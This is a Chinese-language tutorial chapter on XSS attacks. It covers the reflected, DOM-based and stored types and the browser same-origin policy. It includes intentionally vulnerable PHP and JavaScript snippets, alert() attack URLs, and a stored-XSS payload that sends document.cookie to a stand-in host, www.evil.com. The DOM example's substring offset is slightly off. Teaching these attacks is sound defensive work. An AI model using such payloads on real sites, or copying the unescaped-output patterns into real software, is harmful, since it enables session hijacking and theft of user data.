## Web安全之机器学习 -
# ch 3. XSS攻击

************

## 1. XSS攻击的概念和原理

XSS(cross-site scripting)攻击：攻击者在Web页面里插入恶意html标签或者javascript代码，当用户浏览该页或者进行某些操作时，攻击者利用用户对原网站的信任，诱骗用户或浏览器执行一些不安全的操作或者向其它网站提交用户的私密信息。其实现方式往往是在网站开发者提供的用于显示用户数据的地方加入脚本。

XSS攻击的危害包括：
- 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
- 盗窃企业重要的具有商业价值的资料
- 非法转账
- 强制发送电子邮件
- 网站挂马
- 控制受害者机器向其它网站发起攻击

等等。

当用户已经登录了某个网站、便获得了一个session，xss攻击者可以利用这个session，越过用户验证，进行一些不安全的操作。

常见的行为是读取cookie，构造例如一个img标签，将其src属性指向恶意第三方网站，将cookie的内容作为参数附在src的url上，这样黑客就能在其网站上获得你的cookie信息，这就是所谓的cookie劫持。

恶意代码另一种常见的行为是执行GET或POST等操作。GET操作同上，指定img的src方法，中招者的浏览器即会发起一个get请求，其性质可能是删除某个中招者有权限删除的文章之类。POST操作可能是由恶意脚本构建一个表单并直接提交，也可能是构建一个ajax请求提交。

因此，一般的邮箱客户端不会自动从不信任的网站上加载图片（考虑到可以通过img的src属性向第三方站点发送GET请求）；另外，可以设置session的过期时间，让session自动失效。

## 2. XSS攻击方式

XSS攻击可分为三种：反射型，持久型，DOM型。

### 反射型

反射型XSS也称为非持久性XSS（即一次性的攻击，仅对档次的页面访问产生影响）。这种攻击方式中，XSS的Payload通常在url中、并设法让受害者点击该链接。

如果url中的一部分会直接显示到页面上，黑客可以构造一个恶意url，使其中含有xss代码，再把这个url引诱用户点开，用户点开之后，xss代码显示到页面上，被浏览器理解为脚本执行，达到黑客的目的。

例如，如果一个网页从url中读取name参数并显示在页面，那么攻击者可制作恶意url，使得name传入的内容为一个恶意`<script>`。如果网站没有对传入的name参数内容进行过滤，则使得受害者点击时浏览器执行该脚本。

假设后端代码为：
```php
<?php
  $username = $_GET['username'];
  echo $username;
?>
```

攻击链接为：
`http://excample.com?username=<script>alert()</script>`

对于用于攻击的URL，攻击者一般不会直接使用可读形式，而是将其转换成ASCII码。

### DOM型

DOM Based XSS是一种基于网页DOM（文档对象类型）结构的攻击。也通过受害者点击链接触发。
DOM based XSS发生在客户端处理数据阶段，不需要与服务器进行交互，针对的是前端代码(javaScript代码)中的漏洞。

例如，假设前端代码为：
```javascript
<script>
  var temp = document.URL;
  var index = document.URL.indexOf("content=")+4;
  var par = temp.substring(index);
  document.write(decodeURI(par));
</script>
```

攻击链接为：
`http://excample.com?content=<script>alert()</script>`

### 存储型XSS

Stored XSS又称持久型XSS，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。Stored XSS漏洞危害性更大，危害面更广。

例如，excample.com上可以发表文章（或评论），攻击者发布了一篇文章，文章中包含了恶意代码:

```javaScript
<script>window.open("www.evil.com?param="+document.cookie)</script>
```

这时其他用户浏览了文章，于是他们的cookie信息都发送到了攻击者的服务器。

因此，为了安全考虑，网站对于用户输入需要进行标签白名单过滤，或者全部转码为数据。

上面的三种攻击方式总结如下：
<table>
<tr>
<th>攻击类型</th> <th>漏洞</th> <th>攻击方式</th>
</tr>
<tr>
<td> 反射型XSS</td> <td>后端代码漏洞</td> <td>诱骗受害者点击链接。</td>
</tr>
<tr>
<td> DOM型XSS</td> <td>前端代码漏洞</td> <td>诱骗受害者点击链接。</td>
</tr>
<tr>
<td> 存储型XSS</td> <td>后端代码漏洞</td> <td>用户访问被攻击页面。</td>
</tr>
</table>

## 3. 浏览器的同源策略

同源策略是Netscape于1995年提出的一个著名的安全策略，同源策略是浏览器最核心最基础的安全策略。判断同源（origin）的三个要素：

- 相同的协议
- 相同的域名
- 相同的端口号

假如没有同源策略，黑客可以在其恶意页面中嵌入诸如银行页面，并在用户提交银行用户信息时获取到这些输入。或者，假设用户已经成功登录Gmail服务器，同时在同一个浏览器访问恶意站点（另一个浏览器选项卡）；没有同源策略，攻击者可以通过JavaScript获取邮件以及其他敏感信息，发送虚假邮件，查看聊天记录等等。

### 限制范围

非同源的网站之间：

- 无法共享 cookie, localStorage, indexDB
- 无法操作彼此的 dom 元素
- 无法发送 ajax 请求
- 无法通过 flash 发送 http 请求
- 其他

### 跨域

同源策略做了很严格的限制，但是在实际的场景中，又确实有很多地方需要突破同源策略的限制，也就是我们常说的跨域。有很多方式可以实现跨域，例如使用 CORS。以下是一些可以跨域内嵌的资源示例：

- `<script src="..."></script>` 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
- `<link rel="stylesheet" href="...">` 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的 Content-Type 消息头。不同浏览器有不同的限制。
- `<img>` 嵌入图片。支持的图片格式包括 PNG, JPEG, GIF, BMP, SVG, ...
- `<video>` 和 `<audio>` 嵌入多媒体资源。
- `<object>`, `<embed>` 和 `<applet>` 的插件。
-  `@font-face` 引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。
- `<frame>` 和 `<iframe>` 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。

-----

## ref

https://zhuanlan.zhihu.com/p/24780216

https://segmentfault.com/a/1190000007366644

https://segmentfault.com/a/1190000004186889

</br></br>
